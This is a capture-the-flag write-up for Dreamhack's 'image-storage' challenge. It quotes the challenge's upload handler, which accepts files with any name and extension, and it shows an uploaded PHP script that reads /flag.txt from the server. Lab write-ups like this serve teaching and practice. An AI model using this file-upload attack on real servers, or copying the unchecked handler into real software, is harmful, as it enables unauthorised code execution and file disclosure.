# image-storage
> link of prob : https://dreamhack.io/wargame/challenges/38/

<img width="566" alt="image" src="https://github.com/Hueok/dreamhack.io/assets/124287568/b4b65c5d-3f14-42a3-804a-571927013b6c">  

Above is the main page prob has.  
</br>

<img width="569" alt="image" src="https://github.com/Hueok/dreamhack.io/assets/124287568/0d3fe363-1cb5-41a1-93a2-db57e978d025">

We can upload image where _`./upload.php`_  
> The code of _`./upload.php`_ in php tag )
> ```php
><?php
>  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
>    if (isset($_FILES)) {
>      $directory = './uploads/';
>      $file = $_FILES["file"];
>      $error = $file["error"];
>      $name = $file["name"];
>      $tmp_name = $file["tmp_name"];
>     
>      if ( $error > 0 ) {
>        echo "Error: " . $error . "<br>";
>      }else {
>        if (file_exists($directory . $name)) {
>          echo $name . " already exists. ";
>        }else {
>          if(move_uploaded_file($tmp_name, $directory . $name)){
>            echo "Stored in: " . $directory . $name;
>          }
>        }
>      }
>    }else {
>        echo "Error !";
>    }
>    die();
>  }
>?>
> ```

We can't use Path Traversal because our file will not uploaded in name of what we want fully(the special character like `..` can not used by OS).  
But we can upload `file.html` or `command.php` so that xss occur or php command is run.  

I solved this prob by making php code that show the content of specific file by using Path Traversal. The reason why I can use Path Traversal is It just in my own php code.  

The below is that code.
```php
<?php
    $target = fopen("/flag.txt", "r");

    while( !feof($target)){
        echo fgets($target);
    }

    fclose($target);
?> 
```

And then, we can run this code in _`./list.php`_ by clicking href.
